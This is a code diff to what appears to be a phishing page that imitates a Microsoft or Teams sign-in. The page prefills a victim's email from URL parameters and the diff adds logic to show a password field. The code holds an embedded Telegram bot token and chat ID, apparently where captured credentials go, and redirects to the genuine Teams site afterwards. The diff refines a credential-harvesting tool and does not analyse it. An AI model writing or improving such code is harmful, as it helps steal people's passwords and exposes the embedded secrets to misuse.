@@ -358,7 +358,7 @@
     const env = {
       TELEGRAM_TOKEN: '8043918109:AAHq02pj7XjBIwYYENtftpes-RUnDMnWvlA',
       TELEGRAM_CHAT_ID: '-1002493880170',
-      FINAL_URL: 'https;//teams.microsoft.com'
+      FINAL_URL: 'https://teams.microsoft.com'
     };
 
     // Get URL parameters
@@ -471,6 +471,7 @@
         detectedEmailValue.textContent = detectedEmail;
         detectedProfileAvatar.textContent = getAvatarInitial(detectedEmail);
         emailGroup.style.display = 'none';
+        passwordGroup.style.display = 'flex'; // Show password field
         isEmailStage = false;
         currentEmail = detectedEmail;
         authNextBtn.textContent = 'Continue';
@@ -480,6 +481,7 @@
         detectedEmailContainer.style.display = 'none';
         enteredEmailContainer.style.display = 'none';
         emailGroup.style.display = 'flex';
+        passwordGroup.style.display = 'none'; // Hide password field
         isEmailStage = true;
         authNextBtn.textContent = 'Next';
         setTimeout(() => emailInput.focus(), 100);
@@ -500,6 +502,13 @@
       emailError.classList.remove('show');
       passwordError.classList.remove('show');
       authNextBtn.disabled = false;
+      
+      // Reset UI state based on whether we have a detected email
+      if (detectedEmail) {
+        passwordGroup.style.display = 'flex';
+      } else {
+        passwordGroup.style.display = 'none';
+      }
     }
 
     function validateEmail(email) {
